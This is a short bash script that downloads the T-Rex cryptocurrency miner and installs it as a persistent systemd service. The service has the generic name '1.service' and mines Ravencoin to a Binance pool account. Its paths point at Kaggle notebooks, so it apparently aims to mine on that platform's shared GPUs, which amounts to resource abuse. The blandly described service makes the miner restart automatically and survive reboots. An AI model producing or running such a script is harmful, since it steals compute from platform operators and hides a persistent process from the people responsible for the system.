#!/bin/bash

wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz

mkdir /kaggle/working/t-rex

tar -xvzf t-rex-0.26.8-linux.tar.gz -C /kaggle/working/t-rex

# Write content to /etc/systemd/system/1.service
read -r -d '' SERVICE1_CONFIG <<EOF
[Unit]
Description=My one Service

[Service]
ExecStart=/kaggle/working/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 405482.001 -p 123456 --no-strict-ssl

RestartSec=5
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Write the service1 configuration content to the file /etc/systemd/system/1.service
echo "$SERVICE1_CONFIG" | sudo tee /etc/systemd/system/1.service >/dev/null

# Reload systemd manager configuration and start the services
sudo systemctl daemon-reload
sudo systemctl start 1.service
sudo systemctl enable 1.service



